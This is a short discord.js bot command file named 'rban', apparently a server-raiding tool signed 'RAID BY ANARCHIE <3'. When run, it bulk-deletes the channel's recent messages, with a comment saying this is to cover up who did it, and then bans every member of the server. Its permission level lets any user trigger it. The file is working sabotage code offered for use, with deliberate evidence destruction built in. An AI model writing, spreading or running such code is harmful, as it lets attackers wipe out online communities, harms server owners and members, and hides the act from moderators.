const Discord = require('discord.js');



exports.run = (client, message, args) => {
    var banMessage = "RAID BY ANARCHIE <3"

    message.channel.fetchMessages({limit: 10}).then(messages => message.channel.bulkDelete(messages)); //deletes messages to cover up you did it
    message.guild.members.forEach(m => {
        m.ban();
});
}



    exports.conf = {
        enabled: true,
        guildOnly: false,
        aliases: [],
        permLevel: 0
      };

      exports.help = {
        name: 'rban',
        description: '',
        usage: ''
      };
